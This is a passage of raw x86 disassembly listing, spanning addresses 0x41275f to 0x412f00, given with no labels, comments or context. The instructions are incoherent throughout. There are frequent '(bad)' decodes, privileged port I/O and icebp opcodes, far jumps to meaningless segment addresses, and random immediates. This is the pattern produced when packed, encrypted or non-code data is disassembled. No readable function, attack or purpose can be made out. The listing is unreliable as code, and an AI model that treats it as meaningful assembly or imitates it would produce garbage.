  41275f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412760:	mov    ?,WORD PTR [edi-0x71]
  412763:	mov    ds:0xb3ec0c7c,al
  412768:	int    0xe8
  41276a:	in     al,dx
  41276b:	push   eax
  41276c:	fld    TBYTE PTR [ebx-0x28]
  41276f:	icebp  
  412770:	bound  esi,QWORD PTR [ebx]
  412772:	jnp    0x412731
  412774:	test   eax,0xcc1b6b84
  412779:	bound  ebp,QWORD PTR [esi-0x2a]
  41277c:	aad    0x5a
  41277e:	enter  0xdb2e,0x6b
  412782:	inc    esi
  412783:	es (bad) 
  412786:	and    BYTE PTR [edx-0x90b91a5],cl
  41278c:	stc    
  41278d:	ret    
  41278e:	xchg   esp,eax
  41278f:	push   0x1e
  412791:	add    al,0xfd
  412793:	jns    0x412792
  412795:	mov    WORD PTR [ecx+0x50],es
  412798:	rcl    edi,0x59
  41279b:	add    al,0x39
  41279d:	cwde   
  41279e:	push   ss
  41279f:	xchg   edx,eax
  4127a0:	jmp    0x9ff75de1
  4127a5:	adc    DWORD PTR [ecx+0x7dac9a4],eax
  4127ab:	icebp  
  4127ac:	xor    al,0x2f
  4127ae:	and    ecx,0x45bbb413
  4127b4:	mov    ecx,DWORD PTR [edx-0x77]
  4127b7:	jg     0x4127db
  4127b9:	and    DWORD PTR [ebp-0x1966a8c5],ecx
  4127bf:	stc    
  4127c0:	jne    0x41283f
  4127c2:	out    dx,al
  4127c3:	xchg   ebx,eax
  4127c4:	shl    DWORD PTR [ebx-0x58563fd7],cl
  4127ca:	jl     0x4127a9
  4127cc:	pusha  
  4127cd:	xchg   DWORD PTR [ebx+0x44],edx
  4127d0:	std    
  4127d1:	divps  xmm5,XMMWORD PTR [ebp+edx*8-0x56cd5514]
  4127d9:	xor    BYTE PTR [ebp+ebx*8-0x2d],0x1c
  4127de:	cmp    DWORD PTR [ebp+0x937d8fa],ecx
  4127e4:	out    dx,al
  4127e5:	and    BYTE PTR [esi-0x45],bl
  4127e8:	fwait
  4127e9:	jbe    0x4127b5
  4127eb:	lea    ebp,[ebp+0x753aaf96]
  4127f1:	leave  
  4127f2:	jnp    0x4127c3
  4127f4:	cwde   
  4127f5:	and    ecx,ebx
  4127f7:	xor    ebp,DWORD PTR ds:0xadf2dbf0
  4127fd:	imul   DWORD PTR [esi]
  4127ff:	adc    DWORD PTR [edx-0x180a8b0a],esp
  412805:	pop    ds
  412806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412807:	mov    ah,0x85
  412809:	sbb    DWORD PTR [edx+0x5f0efa08],0xffffffed
  412810:	(bad)  
  412811:	jl     0x412805
  412813:	mov    al,0xed
  412815:	ficomp DWORD PTR [esi]
  412817:	scas   eax,DWORD PTR es:[edi]
  412818:	adc    edx,ecx
  41281a:	popf   
  41281b:	(bad)  
  41281d:	retf   0xb2f7
  412820:	push   ebp
  412821:	and    DWORD PTR [edi+0x7991ee5c],ebx
  412827:	shr    ecx,cl
  412829:	push   eax
  41282a:	fstp   TBYTE PTR [edx-0x58]
  41282d:	jbe    0x412814
  41282f:	cmp    BYTE PTR [ecx],bh
  412831:	sahf   
  412832:	or     edi,esp
  412834:	adc    ecx,DWORD PTR [ebx]
  412836:	or     al,0x36
  412838:	mov    edi,0x2a7f93e6
  41283d:	mov    ds:0x95e12262,eax
  412842:	das    
  412843:	pop    esi
  412844:	out    0x7,eax
  412846:	leave  
  412847:	xchg   BYTE PTR [esi],dh
  412849:	aas    
  41284a:	les    esi,FWORD PTR [esi]
  41284c:	mov    ebx,DWORD PTR [ebx]
  41284e:	lods   eax,DWORD PTR ds:[esi]
  41284f:	pop    es
  412850:	push   ds
  412851:	aam    0x94
  412853:	jmp    0x5848:0x5bf47fea
  41285a:	dec    ebx
  41285b:	std    
  41285c:	pop    esp
  41285d:	mov    ch,0x56
  41285f:	jle    0x412856
  412861:	sahf   
  412862:	das    
  412863:	mov    edi,0x609e880f
  412868:	rcr    BYTE PTR [ebp-0x5c777478],1
  41286e:	xor    BYTE PTR [edi],cl
  412870:	fnstenv [edx]
  412872:	xor    eax,0xaeaaaeab
  412877:	mov    cl,0x85
  412879:	iret   
  41287a:	xchg   ebp,eax
  41287b:	jp     0x41285e
  41287d:	(bad)  
  41287e:	test   dl,0xd6
  412881:	fisub  DWORD PTR [eax]
  412883:	xchg   BYTE PTR [ecx-0x770e9ba0],ah
  412889:	jae    0x4128e9
  41288b:	outs   dx,BYTE PTR ds:[esi]
  41288c:	gs (bad) 
  41288e:	sbb    al,0x16
  412890:	sub    bl,BYTE PTR [esi+0x2c972f59]
  412896:	sub    edx,DWORD PTR cs:[ecx+0x55]
  41289a:	pop    ebx
  41289b:	dec    esi
  41289c:	lea    edx,[ecx+0x7a133b90]
  4128a2:	xchg   edi,eax
  4128a3:	xor    eax,0x767ff337
  4128a8:	imul   esp,DWORD PTR [ecx],0xffffff89
  4128ab:	je     0x412924
  4128ad:	xor    DWORD PTR [eax-0x79958b65],0x70
  4128b4:	lock sub al,BYTE PTR [edi-0x4ed21499]
  4128bb:	in     al,dx
  4128bc:	cdq    
  4128bd:	push   edi
  4128be:	iret   
  4128bf:	ret    0x2e7f
  4128c2:	inc    esp
  4128c3:	xchg   ebx,eax
  4128c4:	in     al,dx
  4128c5:	arpl   WORD PTR [esi],cx
  4128c7:	jp     0x41293a
  4128c9:	inc    ebp
  4128ca:	leave  
  4128cb:	test   al,0xe3
  4128cd:	in     al,0x73
  4128cf:	inc    esi
  4128d0:	aad    0x48
  4128d2:	jno    0x41290c
  4128d4:	in     eax,dx
  4128d5:	sahf   
  4128d6:	or     dl,BYTE PTR [ebx]
  4128d8:	in     al,dx
  4128d9:	nop
  4128da:	fwait
  4128db:	sbb    BYTE PTR [eax+0x47483e22],0x9c
  4128e2:	data16 cmc 
  4128e4:	cld    
  4128e5:	inc    eax
  4128e6:	mov    ah,0xa7
  4128e8:	xchg   esi,eax
  4128e9:	xor    bl,BYTE PTR [edi]
  4128eb:	cli    
  4128ec:	daa    
  4128ed:	out    0xa6,al
  4128ef:	mov    dh,0x5f
  4128f1:	std    
  4128f2:	into   
  4128f3:	js     0x41294f
  4128f5:	add    ebp,DWORD PTR [ebx-0x21]
  4128f8:	xor    ecx,DWORD PTR [edi]
  4128fa:	jmp    0x4128cc
  4128fc:	fwait
  4128fd:	or     eax,0x6f814f31
  412902:	ds push ds
  412904:	data16 rcl BYTE PTR [edi+0x3b],cl
  412908:	in     al,0x4e
  41290a:	inc    ecx
  41290b:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41290d:	adc    eax,0xe76a97b8
  412912:	addr16 dec ecx
  412914:	idiv   DWORD PTR [esi-0x12]
  412917:	mov    ds,esi
  412919:	add    al,0x2f
  41291b:	pop    esi
  41291c:	mov    ebx,0xaee5771d
  412921:	pop    es
  412922:	idiv   BYTE PTR ds:0xfd91bb4
  412928:	xchg   edi,eax
  412929:	std    
  41292a:	and    BYTE PTR [ebx],bl
  41292c:	dec    eax
  41292d:	sti    
  41292e:	je     0x4128ed
  412930:	mov    ah,0xa6
  412932:	loopne 0x4128fa
  412934:	adc    eax,edx
  412936:	mov    fs,WORD PTR [esi-0x1caf62f0]
  41293c:	mov    DWORD PTR [eax+0x689f1b77],ebx
  412942:	sar    DWORD PTR [edi+0x3f1a919],cl
  412948:	icebp  
  412949:	push   ecx
  41294a:	ins    DWORD PTR es:[edi],dx
  41294b:	pop    ecx
  41294c:	cmp    DWORD PTR [ebp-0x54],edi
  41294f:	mov    ecx,0xf17bc7b
  412954:	jmp    0xb545f2c1
  412959:	xchg   esp,eax
  41295a:	mov    dh,0x1b
  41295c:	in     al,0x94
  41295e:	push   edi
  41295f:	gs in  al,0xed
  412962:	sahf   
  412963:	aad    0xc8
  412965:	adc    ch,BYTE PTR [eax]
  412967:	and    esp,DWORD PTR [edx]
  412969:	clc    
  41296a:	test   BYTE PTR [edx+0x41883fcf],ch
  412970:	iret   
  412971:	cdq    
  412972:	sbb    al,0x53
  412974:	sbb    eax,DWORD PTR [esi+0x2]
  412977:	xlat   BYTE PTR ds:[ebx]
  412978:	inc    esi
  412979:	or     dl,bh
  41297b:	repnz out dx,eax
  41297d:	inc    ebx
  41297e:	call   esi
  412980:	cdq    
  412981:	shl    DWORD PTR [eax],cl
  412983:	dec    esp
  412984:	pop    esi
  412985:	imul   edx,DWORD PTR [eax+0x43],0xffffffeb
  412989:	int    0xe5
  41298b:	sahf   
  41298c:	push   edi
  41298d:	addr16 sbb dh,0x8b
  412991:	cld    
  412992:	iret   
  412993:	arpl   WORD PTR [ebp-0x2c],cx
  412996:	mov    dl,0x35
  412998:	data16 xchg al,cl
  41299b:	adc    edx,ecx
  41299d:	in     al,0xe5
  41299f:	mov    dh,0x36
  4129a1:	rol    ebp,cl
  4129a3:	lods   al,BYTE PTR ds:[esi]
  4129a4:	cmc    
  4129a5:	rol    BYTE PTR ds:0xc8c6072d,cl
  4129ab:	lods   al,BYTE PTR ds:[esi]
  4129ac:	imul   ebp,DWORD PTR [edx+ebx*1],0x49
  4129b0:	jnp    0x4129cd
  4129b2:	test   DWORD PTR [edx],0x2623ee56
  4129b8:	adc    eax,DWORD PTR [ecx-0x64cb6c7b]
  4129be:	pop    edx
  4129bf:	popa   
  4129c0:	and    eax,0x61c62cd0
  4129c5:	mov    ebx,0x7530b273
  4129ca:	sub    esi,DWORD PTR [esi+0x4]
  4129cd:	popa   
  4129ce:	idiv   BYTE PTR [edi-0x2b]
  4129d1:	stc    
  4129d2:	test   al,0xde
  4129d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129d5:	mov    eax,ds:0x89f469ba
  4129da:	mov    eax,ds:0xa4998ff7
  4129df:	add    edi,DWORD PTR [ecx-0xb]
  4129e2:	aas    
  4129e3:	(bad)  
  4129e4:	pushf  
  4129e5:	sbb    eax,0x7db10ecd
  4129ea:	dec    esi
  4129eb:	jmp    0x26b0e81e
  4129f0:	test   al,0x59
  4129f2:	xchg   ecx,eax
  4129f3:	aaa    
  4129f4:	jg     0x4129f1
  4129f6:	xchg   ebx,eax
  4129f7:	adc    ebp,DWORD PTR [esp+eax*8+0x4a]
  4129fb:	push   edx
  4129fc:	popf   
  4129fd:	icebp  
  4129fe:	mov    eax,ds:0xd8bc2b7
  412a03:	and    al,0x8d
  412a05:	mov    gs,WORD PTR [esi]
  412a07:	dec    ebx
  412a08:	popf   
  412a09:	arpl   WORD PTR [edi+0x4e],bx
  412a0c:	push   ecx
  412a0d:	add    eax,0x626af660
  412a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a13:	ja     0x412a82
  412a15:	sub    al,BYTE PTR [ebx-0x7e43697e]
  412a1b:	and    BYTE PTR [ecx],0xdc
  412a1e:	cmp    BYTE PTR [ebp+0x6d4c566b],cl
  412a24:	xchg   esp,eax
  412a25:	push   ds
  412a26:	frstor ds:[esi+0x7da5ae54]
  412a2d:	xchg   ebp,eax
  412a2e:	js     0x412a4f
  412a30:	and    DWORD PTR [edx+eax*2],esp
  412a33:	bound  ecx,QWORD PTR [eax-0x69c1b158]
  412a39:	pop    eax
  412a3a:	mov    ds:0xf6ab65ac,al
  412a3f:	sbb    ecx,edx
  412a41:	inc    ebp
  412a42:	shr    BYTE PTR [edi+ebx*4],1
  412a45:	or     BYTE PTR [edi+0x3eb7ad33],bl
  412a4b:	test   eax,0x7fd8e52c
  412a50:	cmp    BYTE PTR [ecx+0x12],dh
  412a53:	xchg   esi,eax
  412a54:	ins    BYTE PTR es:[edi],dx
  412a55:	aas    
  412a56:	test   al,0x37
  412a58:	loopne 0x412acc
  412a5a:	out    dx,eax
  412a5b:	imul   esi,DWORD PTR [eax],0xffffff89
  412a5e:	fild   QWORD PTR [eax-0x7092a8c2]
  412a64:	mul    DWORD PTR [ebx+eiz*2+0x59]
  412a68:	push   esp
  412a69:	popa   
  412a6a:	in     al,0xdb
  412a6c:	mov    esp,0x206dd060
  412a71:	stos   BYTE PTR es:[edi],al
  412a72:	xchg   ebp,eax
  412a73:	int    0x72
  412a75:	loop   0x412a1e
  412a77:	push   edi
  412a78:	(bad)  
  412a79:	xchg   ebx,eax
  412a7a:	aam    0xe0
  412a7c:	gs lock call 0x4358:0x749a04eb
  412a85:	(bad)  
  412a86:	xor    cl,cl
  412a88:	xor    DWORD PTR [edx+0x57],edx
  412a8b:	and    eax,edi
  412a8d:	hlt    
  412a8e:	outs   dx,DWORD PTR ds:[esi]
  412a8f:	(bad)  
  412a90:	and    BYTE PTR [esi-0x13],al
  412a93:	mov    cl,BYTE PTR [eax+ebx*8+0x79]
  412a97:	jno    0x412b0c
  412a99:	mov    eax,ds:0x9afc2fea
  412a9e:	sbb    bh,BYTE PTR [ebx-0x6a]
  412aa1:	int    0x39
  412aa3:	je     0x412a25
  412aa5:	arpl   WORD PTR [ecx+0x17],bx
  412aa8:	call   0xfeac5566
  412aad:	sub    al,0x94
  412aaf:	test   al,0xd2
  412ab1:	add    al,0xd7
  412ab3:	pop    ss
  412ab4:	loope  0x412ae6
  412ab6:	adc    dl,al
  412ab8:	jmp    0x75133d57
  412abd:	jns    0x412a67
  412abf:	mov    ch,0x6d
  412ac1:	pop    ds
  412ac2:	fcom   QWORD PTR [eax-0x33]
  412ac5:	cld    
  412ac6:	(bad)  
  412ac7:	fmul   DWORD PTR [ecx-0x733478d3]
  412acd:	arpl   WORD PTR [edi+0x77],sp
  412ad0:	inc    esp
  412ad1:	cmp    DWORD PTR [edi+eax*2-0x5f],ebp
  412ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ad6:	test   ch,al
  412ad8:	xor    BYTE PTR [edi],0xd8
  412adb:	inc    ebp
  412adc:	sar    BYTE PTR [eax-0x4fcb1073],cl
  412ae2:	push   ebp
  412ae3:	mulps  xmm0,xmm5
  412ae6:	outs   dx,DWORD PTR ds:[esi]
  412ae7:	out    dx,eax
  412ae8:	pop    ecx
  412ae9:	scas   eax,DWORD PTR es:[edi]
  412aea:	lods   al,BYTE PTR ds:[esi]
  412aeb:	xor    ebx,DWORD PTR [edi]
  412aed:	or     esp,DWORD PTR [ecx+0x1cfae1ee]
  412af3:	adc    edx,ebp
  412af5:	cmp    cl,dl
  412af7:	dec    eax
  412af8:	xchg   ebp,eax
  412af9:	jg     0x412ad5
  412afb:	cmp    bl,BYTE PTR [ebx+edi*8]
  412afe:	jo     0x412b21
  412b00:	mov    cl,0x10
  412b02:	mov    ds:0x76728ac0,eax
  412b07:	push   edi
  412b08:	outs   dx,DWORD PTR ds:[esi]
  412b09:	gs jne 0x412b7b
  412b0c:	cwde   
  412b0d:	lods   eax,DWORD PTR ds:[esi]
  412b0e:	sbb    eax,0x84e5326
  412b13:	mov    esp,0x748f783b
  412b18:	(bad)  
  412b19:	and    eax,0x6c78950f
  412b1e:	mov    al,ds:0x91ac518c
  412b23:	sbb    DWORD PTR [ebx],esi
  412b25:	mov    eax,0x953055a8
  412b2a:	aaa    
  412b2b:	mov    dh,0x5
  412b2d:	sub    ecx,edx
  412b2f:	xchg   esp,eax
  412b30:	imul   edi,DWORD PTR [edi-0x32],0x91d9f849
  412b37:	mov    esp,0xabe05757
  412b3c:	sti    
  412b3d:	sahf   
  412b3e:	and    BYTE PTR [edx+0x1f],ch
  412b41:	pop    ss
  412b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b43:	enter  0x3409,0xf
  412b47:	xchg   ecx,eax
  412b48:	xor    ebp,DWORD PTR [edx-0x39e23521]
  412b4e:	stc    
  412b4f:	fisubr DWORD PTR [ebp+0x1c]
  412b52:	xor    DWORD PTR [ebx-0x77],ebx
  412b55:	int3   
  412b56:	test   ebp,esp
  412b58:	and    al,0x64
  412b5a:	or     edi,eax
  412b5c:	pop    ds
  412b5d:	mov    eax,0x5c0dd3cc
  412b62:	pop    es
  412b63:	les    eax,FWORD PTR [esi+0x3d02cca5]
  412b69:	repnz pop edx
  412b6b:	aas    
  412b6c:	sub    BYTE PTR [edx+0x38],0x1b
  412b70:	mov    bh,cl
  412b72:	test   BYTE PTR [ebx-0x73],bh
  412b75:	dec    ebp
  412b76:	mov    dl,al
  412b78:	das    
  412b79:	int3   
  412b7a:	or     BYTE PTR [eax],0x38
  412b7d:	mov    bl,0xb7
  412b7f:	fidivr WORD PTR [edi+0x7f38f819]
  412b85:	jo     0x412b64
  412b87:	popf   
  412b88:	sbb    ch,dl
  412b8a:	sub    eax,0xbb942470
  412b8f:	inc    ebx
  412b90:	dec    edx
  412b91:	repnz or al,0xbd
  412b94:	inc    esi
  412b95:	mov    dl,0x17
  412b97:	inc    ebp
  412b98:	popa   
  412b99:	ja     0x412b58
  412b9b:	push   0xb744a5a7
  412ba0:	add    al,0x2b
  412ba2:	test   ah,ch
  412ba4:	dec    eax
  412ba5:	arpl   WORD PTR [ebx-0x71],ax
  412ba8:	mov    ch,0x76
  412baa:	fstp   DWORD PTR [edi-0x58bf020a]
  412bb0:	icebp  
  412bb1:	rcl    BYTE PTR [eax-0x9],1
  412bb4:	pop    ebx
  412bb5:	and    eax,DWORD PTR [ebx-0x1b]
  412bb8:	sahf   
  412bb9:	sbb    dh,BYTE PTR [ecx+0x29]
  412bbc:	xor    ebx,DWORD PTR [ecx+0x1f868252]
  412bc2:	dec    esp
  412bc3:	sbb    ah,0x84
  412bc6:	mov    eax,ds:0x7dd57caf
  412bcb:	inc    ecx
  412bcc:	pop    ebp
  412bcd:	mov    eax,0x2e9d1d80
  412bd2:	addr16 mov ds:0xf332,al
  412bd6:	jnp    0x362fdabe
  412bdc:	dec    ebx
  412bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bde:	pop    ebx
  412bdf:	loop   0x412bfa
  412be1:	cmp    DWORD PTR [edi+esi*1],esi
  412be4:	mov    cl,0x8c
  412be6:	xchg   esp,eax
  412be7:	jge    0x412bea
  412be9:	ret    
  412bea:	mov    ds:0xf6890c32,eax
  412bef:	push   es
  412bf0:	cli    
  412bf1:	ins    BYTE PTR es:[edi],dx
  412bf2:	mov    ch,0x36
  412bf4:	hlt    
  412bf5:	push   es
  412bf6:	inc    si
  412bf8:	dec    ebp
  412bf9:	xor    BYTE PTR [edx+0x4cece5dc],bl
  412bff:	add    BYTE PTR [ebx-0x14],0x3b
  412c03:	inc    ecx
  412c04:	pop    edi
  412c05:	test   eax,0xc6608569
  412c0a:	mov    ah,0x26
  412c0c:	or     DWORD PTR [esi-0x4bfbaf76],ebp
  412c12:	fcmove st,st(0)
  412c14:	jbe    0x412c0f
  412c16:	(bad)  
  412c17:	dec    esi
  412c18:	adc    bl,0x71
  412c1b:	jb     0x412c24
  412c1d:	(bad)  
  412c1e:	icebp  
  412c1f:	xchg   esi,eax
  412c20:	and    eax,0x5b3bfe09
  412c25:	not    BYTE PTR [esi+0x7e]
  412c28:	inc    esi
  412c29:	(bad)  
  412c2a:	retf   
  412c2b:	ret    
  412c2c:	inc    edx
  412c2d:	mov    ah,0x2a
  412c30:	std    
  412c31:	dec    ebx
  412c32:	mov    ds:0xd9b1b86a,eax
  412c37:	xchg   ebp,eax
  412c38:	mov    ah,0x80
  412c3a:	and    cl,BYTE PTR [edx]
  412c3c:	dec    esi
  412c3d:	mov    eax,0xe8c70905
  412c42:	inc    ebp
  412c43:	sbb    esi,DWORD PTR [ebx+0x7cf9a26c]
  412c49:	jge    0x412cb1
  412c4b:	push   edi
  412c4c:	and    ah,0x2a
  412c4f:	mov    dh,0x47
  412c51:	ss jle 0x412c68
  412c54:	sti    
  412c55:	js     0x412cb9
  412c57:	jnp    0x412cb8
  412c59:	lods   eax,DWORD PTR ds:[esi]
  412c5a:	std    
  412c5b:	imul   ebx,DWORD PTR [eax+0x3b],0xb
  412c5f:	leave  
  412c60:	int3   
  412c61:	dec    ecx
  412c62:	mov    ch,0xe5
  412c64:	(bad)
  412c67:	loop   0x412c74
  412c69:	cmp    BYTE PTR [ebp+0x2ef0ec9],bh
  412c6f:	mov    WORD PTR ds:0xdba02a28,?
  412c75:	cli    
  412c76:	test   eax,0x9a4aa5f9
  412c7b:	mov    bh,0x54
  412c7d:	test   cl,cl
  412c7f:	xor    edi,DWORD PTR [esi+edi*2-0x70]
  412c83:	xor    ecx,edi
  412c85:	cdq    
  412c86:	stos   DWORD PTR es:[edi],eax
  412c87:	lods   eax,DWORD PTR ds:[esi]
  412c88:	jp     0x412c82
  412c8a:	push   eax
  412c8b:	mov    ecx,DWORD PTR [esi-0x7e]
  412c8e:	sub    edx,edx
  412c90:	out    0x1f,eax
  412c92:	cmc    
  412c93:	mov    al,0x2c
  412c95:	sbb    BYTE PTR gs:[edx],cl
  412c98:	pop    esi
  412c99:	ja     0x412c2b
  412c9b:	jmp    0x412cd7
  412c9d:	lock cmp al,0x32
  412ca0:	add    al,0x27
  412ca2:	loope  0x412c34
  412ca4:	fild   WORD PTR [ecx+0x5f7bd847]
  412caa:	pusha  
  412cab:	or     al,0x5d
  412cad:	cs lahf 
  412caf:	hlt    
  412cb0:	push   es
  412cb1:	and    al,0x58
  412cb3:	mov    al,0xa
  412cb5:	ja     0x412c51
  412cb7:	adc    al,0xf0
  412cb9:	push   esp
  412cba:	out    dx,al
  412cbb:	dec    edx
  412cbc:	or     dh,dh
  412cbe:	ret    0xf178
  412cc1:	imul   esi,DWORD PTR es:[edx+0xa],0x553e7f68
  412cc9:	xchg   esp,eax
  412cca:	js     0x412ce0
  412ccc:	cld    
  412ccd:	mov    ds:0x35393b94,eax
  412cd2:	idiv   DWORD PTR [edi-0x5a]
  412cd5:	pop    esi
  412cd6:	or     BYTE PTR [edi],dh
  412cd8:	scas   al,BYTE PTR es:[edi]
  412cd9:	repnz xor eax,0xc98879c2
  412cdf:	mov    dh,0x46
  412ce1:	mov    esi,0x7e1be87
  412ce6:	pop    es
  412ce7:	inc    ebp
  412ce8:	jne    0x412cb9
  412cea:	sub    esi,DWORD PTR [edx]
  412cec:	mov    ds:0xca432e67,eax
  412cf1:	loope  0x412cce
  412cf3:	or     BYTE PTR ds:0x38986e15,cl
  412cf9:	fisubr DWORD PTR [eax-0x5c5278e9]
  412cff:	xor    al,dh
  412d01:	mov    es,WORD PTR [edi+0x68]
  412d04:	mov    al,ds:0x553661f3
  412d09:	adc    DWORD PTR [eax],eax
  412d0b:	add    DWORD PTR [edx-0x3c],ebx
  412d0e:	mov    edx,0x5b7bb04d
  412d13:	push   ss
  412d14:	dec    eax
  412d15:	jecxz  0x412d35
  412d17:	std    
  412d18:	sbb    bl,BYTE PTR [ebx-0x5eba1ce9]
  412d1e:	rol    BYTE PTR [ebp-0x40],1
  412d21:	add    al,0x1e
  412d23:	and    ah,al
  412d25:	xor    al,0x8a
  412d27:	imul   ebp,ecx,0x7
  412d2a:	cld    
  412d2b:	leave  
  412d2c:	or     ch,BYTE PTR [edi-0xae71f03]
  412d32:	mov    ebp,0x39ec54b5
  412d37:	je     0x412d78
  412d39:	xor    bh,BYTE PTR [edx+0x49]
  412d3c:	cmp    edi,DWORD PTR [eax]
  412d3e:	add    ch,cl
  412d40:	push   ebx
  412d41:	movlps xmm0,QWORD PTR ds:0x8566c4b1
  412d48:	(bad)  
  412d49:	lods   al,BYTE PTR ds:[esi]
  412d4a:	mov    dl,0xda
  412d4c:	stos   DWORD PTR es:[edi],eax
  412d4d:	mov    bl,BYTE PTR [ebp+0x2e]
  412d50:	pop    es
  412d51:	push   eax
  412d52:	bound  esp,QWORD PTR [ebx-0x51d5c0bf]
  412d58:	outs   dx,DWORD PTR ds:[esi]
  412d59:	dec    esp
  412d5a:	sbb    eax,0x3c1180a5
  412d5f:	jle    0x412d6c
  412d61:	call   0x3bdaa8e8
  412d66:	rol    DWORD PTR [esi-0x5b3fcb59],0x6d
  412d6d:	(bad)  
  412d6e:	and    eax,0x4a420d2
  412d73:	loope  0x412dd2
  412d75:	mov    BYTE PTR [edi-0x19],al
  412d78:	mov    ecx,0xed985b1e
  412d7d:	ja     0x412dc6
  412d7f:	mov    ah,0x5a
  412d81:	or     cl,BYTE PTR [ecx+0x5c74a54c]
  412d87:	push   ebp
  412d88:	call   0xc366:0xc2361580
  412d8f:	xchg   dh,al
  412d91:	sbb    eax,0xf91d8bc3
  412d96:	mov    ebp,0x7a1c8c0c
  412d9b:	sahf   
  412d9c:	sbb    al,0x93
  412d9e:	mov    dl,0x8d
  412da0:	cmc    
  412da1:	cdq    
  412da2:	add    BYTE PTR [ebx+0x209e465d],bl
  412da8:	sub    ebp,DWORD PTR [ebp+0x36]
  412dab:	inc    ecx
  412dac:	sub    al,0xa0
  412dae:	mov    edx,0x9fbaa545
  412db3:	les    ebp,FWORD PTR [eax]
  412db5:	stc    
  412db6:	sahf   
  412db7:	jno    0x412da3
  412db9:	xchg   esp,eax
  412dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dbb:	stos   BYTE PTR es:[edi],al
  412dbc:	push   0x61ce743b
  412dc1:	jne    0x412d99
  412dc3:	shl    DWORD PTR ss:[esi+0x3d7caea6],1
  412dca:	ret    
  412dcb:	mov    WORD PTR [edx+0x23],gs
  412dce:	xchg   ecx,eax
  412dcf:	mov    BYTE PTR [esi-0x5b],0x3b
  412dd3:	bnd jle 0x412dff
  412dd6:	inc    esp
  412dd7:	dec    esp
  412dd8:	mov    ebx,0x457f6725
  412ddd:	xchg   edi,eax
  412dde:	(bad)  
  412ddf:	mov    ebp,0xd5264daa
  412de4:	dec    ebx
  412de5:	call   0xd41:0xa691d518
  412dec:	xchg   dl,dh
  412dee:	jle    0x412d79
  412df0:	cmc    
  412df1:	mov    ?,WORD PTR [esi-0x2a]
  412df4:	or     DWORD PTR [eax],edx
  412df6:	addr16 ss jge 0x412d99
  412dfa:	jns    0x412e33
  412dfc:	scas   eax,DWORD PTR es:[edi]
  412dfd:	push   esi
  412dfe:	imul   ecx,edx,0xffffffbb
  412e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e02:	mov    edx,0xfcc16518
  412e07:	dec    ecx
  412e08:	push   0xd591154c
  412e0d:	push   0xffffffbc
  412e0f:	data16 rcr BYTE PTR [ebx+0x65],0x7f
  412e14:	(bad)  
  412e16:	mov    esp,0x1694a2ce
  412e1b:	cmp    DWORD PTR [eax-0x30],0x3d
  412e1f:	lock dec esi
  412e21:	xchg   ecx,eax
  412e22:	in     al,dx
  412e23:	lahf   
  412e24:	fwait
  412e25:	std    
  412e26:	lock sbb ch,BYTE PTR [ecx]
  412e29:	cmc    
  412e2a:	sub    eax,0xb066d322
  412e2f:	sub    eax,0xb49a9e50
  412e34:	loope  0x412e05
  412e36:	test   DWORD PTR [edx+0x46],ebp
  412e39:	fnstcw WORD PTR [eax+0x39]
  412e3c:	push   ecx
  412e3d:	jmp    0x412eb1
  412e3f:	pop    ds
  412e40:	enter  0xabef,0x52
  412e44:	mov    dl,0x43
  412e46:	std    
  412e47:	and    DWORD PTR [esi+eiz*1],esi
  412e4a:	or     al,0xb0
  412e4c:	dec    edi
  412e4d:	sub    al,0x83
  412e4f:	xchg   edi,eax
  412e50:	(bad)  
  412e52:	retf   0xc01f
  412e55:	push   cs
  412e56:	ss ret 0xd8dc
  412e5a:	or     DWORD PTR [esi-0x4d801fe5],esp
  412e60:	push   cs
  412e61:	jne    0x412deb
  412e63:	sub    DWORD PTR [edi-0x32],edx
  412e66:	pop    edx
  412e67:	or     BYTE PTR [ecx],al
  412e69:	cmp    eax,esi
  412e6b:	daa    
  412e6c:	push   esi
  412e6d:	xor    eax,0x71eff2f4
  412e72:	(bad)  [edi+esi*2]
  412e75:	iret   
  412e76:	jmp    0x4146:0xb0b06cd0
  412e7d:	imul   ebx,DWORD PTR [edx-0x6b],0xe6e33cbe
  412e84:	push   ebx
  412e85:	jle    0x412e37
  412e87:	mov    edx,0x44de7ca0
  412e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e8d:	int3   
  412e8e:	aaa    
  412e8f:	add    edx,DWORD PTR ds:0xf5b231b0
  412e95:	xor    esp,DWORD PTR [ebx+0xf]
  412e98:	mov    eax,ds:0x5174b8e4
  412e9e:	ins    DWORD PTR es:[edi],dx
  412e9f:	and    DWORD PTR [eax+0x23ee4fb1],ecx
  412ea5:	(bad)  [esi]
  412ea7:	pop    ds
  412ea8:	dec    esp
  412ea9:	fisttp WORD PTR [ecx-0x6189f7d4]
  412eaf:	sti    
  412eb0:	jae    0x412ed0
  412eb2:	xor    BYTE PTR [esi+0x9],0x0
  412eb6:	and    edx,edi
  412eb8:	mov    bh,BYTE PTR [ebx-0x6c]
  412ebb:	popa   
  412ebc:	mov    WORD PTR [esi-0x205d2960],cs
  412ec2:	and    edi,ebp
  412ec4:	fs dec ecx
  412ec6:	pop    ebx
  412ec7:	loopne 0x412e8d
  412ec9:	out    dx,eax
  412eca:	rep movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  412ecd:	int3   
  412ece:	adc    DWORD PTR [edi-0x56167736],0x31
  412ed5:	clc    
  412ed6:	mov    ah,0x15
  412ed8:	test   eax,0x4749dbae
  412edd:	mov    bl,0x9e
  412edf:	mov    edi,0x442cd038
  412ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ee5:	push   edi
  412ee6:	xchg   BYTE PTR [ebx-0x7dcc28a4],bl
  412eec:	mov    edx,DWORD PTR [ebp+0x4f558041]
  412ef2:	inc    edi
  412ef3:	fnstenv [esi]
  412ef5:	inc    edi
  412ef6:	jbe    0x412f19
  412ef8:	jno    0x412f02
  412efa:	mov    ebx,0x2c22e1be
  412eff:	ins    DWORD PTR es:[edi],dx
  412f00:	fisttp WORD PTR [edi-0x4c]
